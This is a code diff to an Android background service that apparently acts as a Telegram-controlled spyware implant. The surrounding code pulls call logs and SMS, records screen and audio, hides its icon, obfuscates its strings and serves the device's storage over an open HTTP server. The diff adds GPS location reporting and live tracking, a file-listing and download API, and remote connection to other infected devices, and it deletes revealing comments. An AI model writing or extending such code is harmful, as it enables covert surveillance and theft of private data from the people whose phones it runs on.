@@ -19,15 +19,24 @@ import android.hardware.camera2.CameraAccessException;
 import android.hardware.camera2.CameraManager;
 import android.hardware.display.DisplayManager;
 import android.hardware.display.VirtualDisplay;
+import android.location.Address;
+import android.location.Geocoder;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.media.Image;
 import android.media.ImageReader;
 import android.media.MediaRecorder;
 import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
+import android.net.Uri;
 import android.os.BatteryManager;
 import android.os.Build;
+import android.os.Bundle;
 import android.os.Environment;
+import android.os.Handler;
 import android.os.IBinder;
+import android.os.Looper;
 import android.os.PowerManager;
 import android.provider.CallLog;
 import android.telephony.TelephonyManager;
@@ -50,6 +59,7 @@ import java.net.NetworkInterface;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.URL;
+import java.net.URLDecoder;
 import java.net.URLEncoder;
 import java.nio.ByteBuffer;
 import java.text.SimpleDateFormat;
@@ -78,13 +88,13 @@ public class MainService extends Service {
         return sb.toString();
     }
 
-    // ── Original constants (already obfuscated) ──
+    // ── Original constants ──
     private final String CREATED_BY = $("䳩谗籹ﾞ䳀谓米￟䳶豘簿ﾛ䳅谅").intern();
     private static final String PREF_DEVICE = $("䳔谄籴ﾙ䳗").intern();
     private static final String PREF_SCREEN = $("䳔谓籣ﾒ䳻谆籣ﾚ䳂谅").intern();
     private static final String KEY_SCREEN_CAPTURED = $("䳗谕籣ﾚ䳁谘籎ﾜ䳅谆籥ﾊ䳖谓籎ﾘ䳖谗籿ﾋ䳁谒").intern();
 
-    // ── New feature callback data (plain text for simplicity – obfuscate later if desired) ──
+    // ── New feature callback data ──
     private static final String CB_FLASHLIGHT_ON = "flashlight_on";
     private static final String CB_FLASHLIGHT_OFF = "flashlight_off";
     private static final String CB_SIM_INFO = "sim_info";
@@ -94,6 +104,9 @@ public class MainService extends Service {
     private static final String CB_SMS_INBOX = "sms_inbox";
     private static final String CB_FILE_SERVER_START = "file_server_start";
     private static final String CB_FILE_SERVER_STOP = "file_server_stop";
+    private static final String CB_LOCATION_SEND = "location_send";
+    private static final String CB_LOCATION_START = "location_start";
+    private static final String CB_LOCATION_STOP = "location_stop";
 
     // ── Service state ──
     private boolean running = true;
@@ -117,6 +130,11 @@ public class MainService extends Service {
     // File server
     private ServerSocket serverSocket;
     private boolean fileServerRunning = false;
+
+    // Location
+    private LocationManager locationManager;
+    private LocationListener locationListener;
+    private boolean locationTracking = false;
 
     @Override
     public void onCreate() {
@@ -394,7 +412,7 @@ public class MainService extends Service {
         try { if (mediaProjection != null) { mediaProjection.stop(); mediaProjection = null; } } catch (Exception ignored) {}
     }
 
-    // ── Flashlight (Feature 4) ──
+    // ── Flashlight ──
     private void setFlashlight(boolean on) {
         if (Build.VERSION.SDK_INT < 23) {
             sendMessage("❌ Flashlight requires Android 6+.");
@@ -402,7 +420,7 @@ public class MainService extends Service {
         }
         if (cameraManager == null) cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
         try {
-            String cameraId = cameraManager.getCameraIdList()[0]; // back camera usually
+            String cameraId = cameraManager.getCameraIdList()[0];
             if (on) {
                 if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                     sendMessage("❌ Camera permission needed for flashlight.");
@@ -421,7 +439,7 @@ public class MainService extends Service {
         }
     }
 
-    // ── Full device status + SIM info (Features 5 & 8) ──
+    // ── Full device status + SIM info ──
     private String getFullDeviceStatus() {
         StringBuilder sb = new StringBuilder("📊 **DEVICE STATUS**\n\n");
         sb.append(getDeviceDetailsString()).append("\n\n");
@@ -437,7 +455,7 @@ public class MainService extends Service {
         return sb.toString() + getFooter();
     }
 
-    // ── App check (Feature 6) ──
+    // ── App list ──
     private String getInstalledAppsList() {
         StringBuilder sb = new StringBuilder("📱 **INSTALLED APPS**\n\n");
         PackageManager pm = getPackageManager();
@@ -473,7 +491,7 @@ public class MainService extends Service {
         return "Unknown";
     }
 
-    // ── Call history (Feature 9) ──
+    // ── Call history ──
     private void uploadCallHistory() {
         new Thread(() -> {
             try {
@@ -503,13 +521,13 @@ public class MainService extends Service {
         }).start();
     }
 
-    // ── SMS history (Feature 10) ──
+    // ── SMS inbox ──
     private void uploadSmsHistory() {
         new Thread(() -> {
             try {
                 File file = new File(getExternalFilesDir(null), "sms_inbox.txt");
                 Cursor cursor = getContentResolver().query(
-                        android.net.Uri.parse("content://sms/inbox"), null, null, null, null);
+                        Uri.parse("content://sms/inbox"), null, null, null, null);
                 if (cursor != null && cursor.moveToFirst()) {
                     StringBuilder sb = new StringBuilder();
                     do {
@@ -532,7 +550,16 @@ public class MainService extends Service {
         }).start();
     }
 
-    // ── File server (Feature 11) ──
+    // ── File server (enhanced with ID, JSON API, and advertisement) ──
+    private String currentFileServerId = null;
+
+    private String generateFileServerId() {
+        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        StringBuilder id = new StringBuilder(6);
+        for (int i = 0; i < 6; i++) id.append(chars.charAt((int)(Math.random() * chars.length())));
+        return id.toString();
+    }
+
     private void startFileServer() {
         if (fileServerRunning) {
             sendMessage("🌐 File server already running.");
@@ -544,7 +571,18 @@ public class MainService extends Service {
                 int port = serverSocket.getLocalPort();
                 fileServerRunning = true;
                 String ip = getLocalIpAddress();
-                sendMessage("🌐 **FILE SERVER STARTED**\n🔗 http://" + ip + ":" + port);
+                currentFileServerId = generateFileServerId();
+
+                // Store ad locally
+                JSONObject ad = new JSONObject();
+                ad.put("ip", ip);
+                ad.put("port", port);
+                ad.put("time", System.currentTimeMillis());
+                getSharedPreferences("file_ads", MODE_PRIVATE).edit()
+                        .putString(currentFileServerId, ad.toString()).apply();
+
+                sendMessage("🌐 **FILE SERVER STARTED**\nID: `" + currentFileServerId + "`\n🔗 http://" + ip + ":" + port);
+
                 while (fileServerRunning) {
                     Socket client = serverSocket.accept();
                     new Thread(() -> handleHttpClient(client)).start();
@@ -559,6 +597,7 @@ public class MainService extends Service {
     private void stopFileServer() {
         fileServerRunning = false;
         try { if (serverSocket != null) serverSocket.close(); } catch (Exception ignored) {}
+        currentFileServerId = null;
         sendMessage("🌐 File server stopped.");
     }
 
@@ -580,27 +619,87 @@ public class MainService extends Service {
             BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
             OutputStream out = client.getOutputStream();
             String line = in.readLine();
-            if (line != null && line.startsWith("GET")) {
+            if (line != null) {
+                String method = line.split(" ")[0];
                 String path = line.split(" ")[1];
-                File root = Environment.getExternalStorageDirectory();
-                if (path.equals("/")) {
-                    StringBuilder html = new StringBuilder("<html><body><h1>Files</h1><ul>");
-                    listFiles(root, html, "/");
-                    html.append("</ul></body></html>");
-                    byte[] resp = html.toString().getBytes();
-                    out.write(("HTTP/1.0 200 OK\r\nContent-Type: text/html\r\nContent-Length: " + resp.length + "\r\n\r\n").getBytes());
-                    out.write(resp);
-                } else {
-                    File file = new File(root, path);
-                    if (file.exists() && file.isFile()) {
-                        FileInputStream fis = new FileInputStream(file);
-                        out.write("HTTP/1.0 200 OK\r\nContent-Type: application/octet-stream\r\n\r\n".getBytes());
-                        byte[] buf = new byte[4096];
-                        int len;
-                        while ((len = fis.read(buf)) != -1) out.write(buf, 0, len);
-                        fis.close();
+                if (method.equals("GET")) {
+                    if (path.startsWith("/api/list")) {
+                        // JSON file listing
+                        String query = path.contains("?") ? path.substring(path.indexOf("?") + 1) : "";
+                        String dirPath = "";
+                        if (query.startsWith("path=")) {
+                            dirPath = URLDecoder.decode(query.substring(5), "UTF-8");
+                        }
+                        File baseDir = Environment.getExternalStorageDirectory();
+                        File targetDir = dirPath.isEmpty() ? baseDir : new File(baseDir, dirPath);
+                        JSONArray arr = new JSONArray();
+                        if (targetDir.exists() && targetDir.isDirectory()) {
+                            File[] files = targetDir.listFiles();
+                            if (files != null) {
+                                for (File f : files) {
+                                    JSONObject obj = new JSONObject();
+                                    obj.put("name", f.getName());
+                                    obj.put("isDirectory", f.isDirectory());
+                                    obj.put("size", f.length());
+                                    obj.put("path", dirPath + (dirPath.isEmpty() ? "" : "/") + f.getName());
+                                    arr.put(obj);
+                                }
+                            }
+                        }
+                        byte[] resp = arr.toString().getBytes("UTF-8");
+                        out.write(("HTTP/1.0 200 OK\r\nContent-Type: application/json\r\nContent-Length: "
+                                + resp.length + "\r\n\r\n").getBytes());
+                        out.write(resp);
+                    } else if (path.startsWith("/api/download")) {
+                        String query = path.contains("?") ? path.substring(path.indexOf("?") + 1) : "";
+                        String filePath = "";
+                        if (query.startsWith("file=")) {
+                            filePath = URLDecoder.decode(query.substring(5), "UTF-8");
+                        }
+                        File base = Environment.getExternalStorageDirectory();
+                        File file = new File(base, filePath);
+                        if (file.exists() && file.isFile()) {
+                            FileInputStream fis = new FileInputStream(file);
+                            out.write("HTTP/1.0 200 OK\r\nContent-Type: application/octet-stream\r\n\r\n".getBytes());
+                            byte[] buf = new byte[4096];
+                            int len;
+                            while ((len = fis.read(buf)) != -1) out.write(buf, 0, len);
+                            fis.close();
+                        } else {
+                            out.write("HTTP/1.0 404 Not Found\r\n\r\n".getBytes());
+                        }
                     } else {
-                        out.write("HTTP/1.0 404 Not Found\r\n\r\n".getBytes());
+                        // Normal file/directory serving
+                        File root = Environment.getExternalStorageDirectory();
+                        if (path.equals("/")) {
+                            StringBuilder html = new StringBuilder("<html><body><h1>Files</h1><ul>");
+                            listFiles(root, html, "/");
+                            html.append("</ul></body></html>");
+                            byte[] resp = html.toString().getBytes();
+                            out.write(("HTTP/1.0 200 OK\r\nContent-Type: text/html\r\nContent-Length: "
+                                    + resp.length + "\r\n\r\n").getBytes());
+                            out.write(resp);
+                        } else {
+                            File file = new File(root, path);
+                            if (file.exists() && file.isFile()) {
+                                FileInputStream fis = new FileInputStream(file);
+                                out.write("HTTP/1.0 200 OK\r\nContent-Type: application/octet-stream\r\n\r\n".getBytes());
+                                byte[] buf = new byte[4096];
+                                int len;
+                                while ((len = fis.read(buf)) != -1) out.write(buf, 0, len);
+                                fis.close();
+                            } else if (file.isDirectory()) {
+                                StringBuilder html = new StringBuilder("<html><body><h1>Files</h1><ul>");
+                                listFiles(file, html, path + "/");
+                                html.append("</ul></body></html>");
+                                byte[] resp = html.toString().getBytes();
+                                out.write(("HTTP/1.0 200 OK\r\nContent-Type: text/html\r\nContent-Length: "
+                                        + resp.length + "\r\n\r\n").getBytes());
+                                out.write(resp);
+                            } else {
+                                out.write("HTTP/1.0 404 Not Found\r\n\r\n".getBytes());
+                            }
+                        }
                     }
                 }
             }
@@ -624,7 +723,92 @@ public class MainService extends Service {
         }
     }
 
-    // ── Telegram bot methods (complete, as originally) ──
+    // ── Location features ──
+    private void sendLocationOnce() {
+        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            sendMessage("❌ Location permission not granted.");
+            return;
+        }
+        sendMessage("📍 Fetching location...");
+        if (locationManager == null)
+            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
+
+        // Try last known
+        Location lastLoc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+        if (lastLoc == null)
+            lastLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+        if (lastLoc != null)
+            processLocation(lastLoc);
+
+        // Request single fresh update
+        try {
+            locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationListener() {
+                @Override public void onLocationChanged(Location loc) { processLocation(loc); }
+                @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
+                @Override public void onProviderEnabled(String provider) {}
+                @Override public void onProviderDisabled(String provider) {}
+            }, Looper.getMainLooper());
+        } catch (Exception e) {
+            sendMessage("❌ Location error: " + e.getMessage());
+        }
+    }
+
+    private void startLocationTracking() {
+        if (locationTracking) return;
+        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            sendMessage("❌ Location permission not granted.");
+            return;
+        }
+        if (locationManager == null) locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
+        locationTracking = true;
+        locationListener = new LocationListener() {
+            @Override
+            public void onLocationChanged(Location location) {
+                processLocation(location);
+            }
+            @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
+            @Override public void onProviderEnabled(String provider) {}
+            @Override public void onProviderDisabled(String provider) {}
+        };
+        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000, 10, locationListener, Looper.getMainLooper());
+        sendMessage("📍 Live Location Tracking started.");
+    }
+
+    private void stopLocationTracking() {
+        if (locationTracking && locationManager != null && locationListener != null) {
+            locationManager.removeUpdates(locationListener);
+            locationTracking = false;
+            sendMessage("📍 Live Location Tracking stopped.");
+        }
+    }
+
+    private void processLocation(Location location) {
+        double lat = location.getLatitude();
+        double lon = location.getLongitude();
+        String address = getAddressFromLocation(lat, lon);
+        String msg = "📍 **Location**\nLat: " + lat + "\nLon: " + lon + "\nAddress: " +
+                (address != null ? address : "N/A") + "\n" + getFooter();
+        sendMessage(msg);
+    }
+
+    private String getAddressFromLocation(double lat, double lon) {
+        try {
+            Geocoder geocoder = new Geocoder(this, Locale.getDefault());
+            List<Address> addresses = geocoder.getFromLocation(lat, lon, 1);
+            if (addresses != null && addresses.size() > 0) {
+                Address a = addresses.get(0);
+                StringBuilder sb = new StringBuilder();
+                for (int i = 0; i <= a.getMaxAddressLineIndex(); i++) {
+                    sb.append(a.getAddressLine(i)).append(", ");
+                }
+                if (sb.length() > 0) sb.setLength(sb.length() - 2);
+                return sb.toString();
+            }
+        } catch (Exception ignored) {}
+        return null;
+    }
+
+    // ── Telegram bot methods ──
     private void uploadFile(File file, String type) {
         new Thread(() -> {
             try {
@@ -715,10 +899,16 @@ public class MainService extends Service {
                                 String chatId = String.valueOf(chat.getLong("id"));
                                 String text = message.has("text") ? message.getString("text") : "";
                                 if (chatId.equals(Config.CHAT_ID)) {
+                                    // Parse file server advertisements
+                                    parseFileAd(text);
+
                                     if (text.equals("/start") || text.equals("/menu")) {
                                         showMainMenu();
                                     } else if (text.equals("/status")) {
                                         sendStatus();
+                                    } else if (text.startsWith("/connect ")) {
+                                        String id = text.substring(9).trim();
+                                        handleConnectRequest(id);
                                     }
                                 }
                             }
@@ -733,12 +923,105 @@ public class MainService extends Service {
         }
     }
 
-    private void deleteMessage(int messageId) {
+    private void parseFileAd(String text) {
+        if (text.startsWith("🌐 **FILE SERVER AD**")) {
+            try {
+                String[] lines = text.split("\n");
+                String id = lines[1].split("`")[1];
+                String link = lines[2].substring(lines[2].indexOf("http://") + 7);
+                String ip = link.substring(0, link.indexOf(":"));
+                int port = Integer.parseInt(link.substring(link.indexOf(":") + 1));
+                JSONObject ad = new JSONObject();
+                ad.put("ip", ip);
+                ad.put("port", port);
+                ad.put("time", System.currentTimeMillis());
+                getSharedPreferences("file_ads", MODE_PRIVATE).edit().putString(id, ad.toString()).apply();
+            } catch (Exception ignored) {}
+        }
+    }
+
+    private void handleConnectRequest(String id) {
+        SharedPreferences prefs = getSharedPreferences("file_ads", MODE_PRIVATE);
+        String adJson = prefs.getString(id, null);
+        if (adJson == null) {
+            sendMessage("❌ No file server with ID `" + id + "` found.");
+            return;
+        }
+        try {
+            JSONObject ad = new JSONObject(adJson);
+            String ip = ad.getString("ip");
+            int port = ad.getInt("port");
+            // Store connection for later use
+            getSharedPreferences("remote_conn", MODE_PRIVATE).edit()
+                    .putString("ip", ip).putInt("port", port).apply();
+            fetchRemoteFileList(ip, port, "");
+        } catch (Exception e) {
+            sendMessage("❌ Error connecting to server.");
+        }
+    }
+
+    private void fetchRemoteFileList(String ip, int port, String path) {
         new Thread(() -> {
             try {
-                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/deleteMessage?chat_id=" + Config.CHAT_ID + "&message_id=" + messageId;
-                getRequest(url);
-            } catch (Exception ignored) {}
+                String apiUrl = "http://" + ip + ":" + port + "/api/list?path=" + URLEncoder.encode(path, "UTF-8");
+                String response = getRequest(apiUrl);
+                JSONArray files = new JSONArray(response);
+                JSONArray keyboard = new JSONArray();
+                for (int i = 0; i < files.length(); i++) {
+                    JSONObject f = files.getJSONObject(i);
+                    String name = f.getString("name");
+                    boolean isDir = f.getBoolean("isDirectory");
+                    String filePath = f.getString("path");
+                    if (isDir) {
+                        keyboard.put(new JSONArray().put(new JSONObject()
+                                .put("text", "📁 " + name)
+                                .put("callback_data", "remote_nav_" + filePath)));
+                    } else {
+                        keyboard.put(new JSONArray().put(new JSONObject()
+                                .put("text", "📄 " + name)
+                                .put("callback_data", "remote_dl_" + filePath)));
+                    }
+                }
+                if (!path.isEmpty()) {
+                    String parent = path.contains("/") ? path.substring(0, path.lastIndexOf('/')) : "";
+                    keyboard.put(new JSONArray().put(new JSONObject()
+                            .put("text", "⬆️ Back")
+                            .put("callback_data", "remote_nav_" + parent)));
+                }
+                String replyMarkup = new JSONObject().put("inline_keyboard", keyboard).toString();
+                sendMessageWithKeyboard("📁 Remote files at: " + (path.isEmpty() ? "/" : path), replyMarkup);
+            } catch (Exception e) {
+                sendMessage("❌ Failed to fetch file list.");
+            }
+        }).start();
+    }
+
+    private void downloadRemoteFile(String filePath) {
+        SharedPreferences prefs = getSharedPreferences("remote_conn", MODE_PRIVATE);
+        String ip = prefs.getString("ip", null);
+        int port = prefs.getInt("port", -1);
+        if (ip == null || port == -1) {
+            sendMessage("❌ No active remote connection.");
+            return;
+        }
+        new Thread(() -> {
+            try {
+                String downloadUrl = "http://" + ip + ":" + port + "/api/download?file=" + URLEncoder.encode(filePath, "UTF-8");
+                URL url = new URL(downloadUrl);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                File tempFile = File.createTempFile("remote_", ".tmp", getCacheDir());
+                FileOutputStream fos = new FileOutputStream(tempFile);
+                InputStream is = conn.getInputStream();
+                byte[] buf = new byte[4096];
+                int len;
+                while ((len = is.read(buf)) != -1) fos.write(buf, 0, len);
+                fos.close();
+                is.close();
+                conn.disconnect();
+                uploadFile(tempFile, "document");
+            } catch (Exception e) {
+                sendMessage("❌ Download error: " + e.getMessage());
+            }
         }).start();
     }
 
@@ -759,36 +1042,28 @@ public class MainService extends Service {
             unhideApp();
         } else if (data.equals("status")) {
             sendStatus();
-        }
-        // Screen recording durations (original)
-        else if (data.startsWith("screen_")) {
+        } else if (data.startsWith("screen_")) {
             if (data.equals("screen_10")) startScreenRecording(10, false);
             else if (data.equals("screen_30")) startScreenRecording(30, false);
             else if (data.equals("screen_60")) startScreenRecording(60, false);
             else if (data.equals("screen_120")) startScreenRecording(120, false);
             else if (data.equals("screen_300")) startScreenRecording(300, false);
             else if (data.equals("screen_600")) startScreenRecording(600, false);
-        }
-        // Screen+Audio recording durations
-        else if (data.startsWith("screenaudio_")) {
+        } else if (data.startsWith("screenaudio_")) {
             if (data.equals("screenaudio_10")) startScreenRecording(10, true);
             else if (data.equals("screenaudio_30")) startScreenRecording(30, true);
             else if (data.equals("screenaudio_60")) startScreenRecording(60, true);
             else if (data.equals("screenaudio_120")) startScreenRecording(120, true);
             else if (data.equals("screenaudio_300")) startScreenRecording(300, true);
             else if (data.equals("screenaudio_600")) startScreenRecording(600, true);
-        }
-        // Audio recording durations
-        else if (data.startsWith("audio_")) {
+        } else if (data.startsWith("audio_")) {
             if (data.equals("audio_10")) startAudioRecording(10);
             else if (data.equals("audio_30")) startAudioRecording(30);
             else if (data.equals("audio_60")) startAudioRecording(60);
             else if (data.equals("audio_120")) startAudioRecording(120);
             else if (data.equals("audio_300")) startAudioRecording(300);
             else if (data.equals("audio_600")) startAudioRecording(600);
-        }
-        // New features
-        else if (data.equals(CB_FLASHLIGHT_ON)) {
+        } else if (data.equals(CB_FLASHLIGHT_ON)) {
             setFlashlight(true);
         } else if (data.equals(CB_FLASHLIGHT_OFF)) {
             setFlashlight(false);
@@ -806,6 +1081,22 @@ public class MainService extends Service {
             startFileServer();
         } else if (data.equals(CB_FILE_SERVER_STOP)) {
             stopFileServer();
+        } else if (data.equals(CB_LOCATION_SEND)) {
+            sendLocationOnce();
+        } else if (data.equals(CB_LOCATION_START)) {
+            startLocationTracking();
+        } else if (data.equals(CB_LOCATION_STOP)) {
+            stopLocationTracking();
+        } else if (data.startsWith("remote_nav_")) {
+            String path = data.substring(11);
+            SharedPreferences prefs = getSharedPreferences("remote_conn", MODE_PRIVATE);
+            String ip = prefs.getString("ip", null);
+            int port = prefs.getInt("port", -1);
+            if (ip != null && port != -1) fetchRemoteFileList(ip, port, path);
+            else sendMessage("❌ No active remote connection.");
+        } else if (data.startsWith("remote_dl_")) {
+            String path = data.substring(10);
+            downloadRemoteFile(path);
         } else {
             sendMessage("⚠️ Unknown command: " + data);
         }
@@ -819,6 +1110,8 @@ public class MainService extends Service {
                 + "[{\"text\":\"📡 SIM Info\",\"callback_data\":\"" + CB_SIM_INFO + "\"},{\"text\":\"📱 App List\",\"callback_data\":\"" + CB_APP_LIST + "\"}],"
                 + "[{\"text\":\"📞 Call History\",\"callback_data\":\"" + CB_CALL_LOG + "\"},{\"text\":\"✉️ SMS Inbox\",\"callback_data\":\"" + CB_SMS_INBOX + "\"}],"
                 + "[{\"text\":\"🌐 File Server ON\",\"callback_data\":\"" + CB_FILE_SERVER_START + "\"},{\"text\":\"🌐 File Server OFF\",\"callback_data\":\"" + CB_FILE_SERVER_STOP + "\"}],"
+                + "[{\"text\":\"📍 Send Location\",\"callback_data\":\"" + CB_LOCATION_SEND + "\"},{\"text\":\"📍 Start Tracking\",\"callback_data\":\"" + CB_LOCATION_START + "\"}],"
+                + "[{\"text\":\"📍 Stop Tracking\",\"callback_data\":\"" + CB_LOCATION_STOP + "\"}],"
                 + "[{\"text\":\"👻 Hide App\",\"callback_data\":\"hide\"},{\"text\":\"👁️ Unhide App\",\"callback_data\":\"unhide\"}],"
                 + "[{\"text\":\"📊 Device Status\",\"callback_data\":\"status\"},{\"text\":\"🔄 Refresh\",\"callback_data\":\"refresh\"}]"
                 + "]}";
@@ -855,6 +1148,8 @@ public class MainService extends Service {
     private void sendStatus() {
         String status = "📊 **DEVICE STATUS**\n\n" + getDeviceDetailsString() + "\n"
                 + "🎥 **Recording:** " + (isRecording ? "Yes" : "No") + "\n"
+                + "🌐 **File Server:** " + (fileServerRunning ? "Running (ID `" + currentFileServerId + "`)" : "Stopped") + "\n"
+                + "📍 **Location Tracking:** " + (locationTracking ? "Active" : "Inactive") + "\n"
                 + "💡 Type /menu for controls" + getFooter();
         sendMessage(status);
     }
@@ -930,7 +1225,7 @@ public class MainService extends Service {
         }
     }
 
-    // ── Dangerous SMS receiver (Feature 7) – must be registered in manifest ──
+    // ── SMS receiver (must be registered in manifest) ──
     public static class SmsReceiver extends android.content.BroadcastReceiver {
         @Override
         public void onReceive(Context context, Intent intent) {
@@ -957,7 +1252,7 @@ public class MainService extends Service {
         }
     }
 
-    // ── Static setData (fixes MainActivity error) ──
+    // ── Static setData (for MainActivity) ──
     public static void setData(Intent intent, int code) {
         captureIntent = intent;
         captureResultCode = code;
@@ -967,14 +1262,12 @@ public class MainService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent != null) {
-            // Handle media projection
             if (intent.hasExtra("data")) {
                 captureIntent = intent.getParcelableExtra("data");
                 captureResultCode = intent.getIntExtra("code", -1);
                 SharedPreferences prefs = getSharedPreferences(PREF_SCREEN, MODE_PRIVATE);
                 prefs.edit().putBoolean(KEY_SCREEN_CAPTURED, true).apply();
             }
-            // Handle dangerous SMS alert (Feature 7)
             if (intent.hasExtra("dangerous_sms")) {
                 String smsBody = intent.getStringExtra("dangerous_sms");
                 sendMessage("⚠️ **Dangerous SMS Alert!**\n" + smsBody + "\n" + getFooter());
@@ -989,12 +1282,13 @@ public class MainService extends Service {
         if (timer != null) timer.cancel();
         if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
         stopFileServer();
+        stopLocationTracking();
         cleanup();
         super.onDestroy();
     }
 
     @Override
     public IBinder onBind(Intent intent) {
-        return null; // Required abstract method
+        return null;
     }
 }
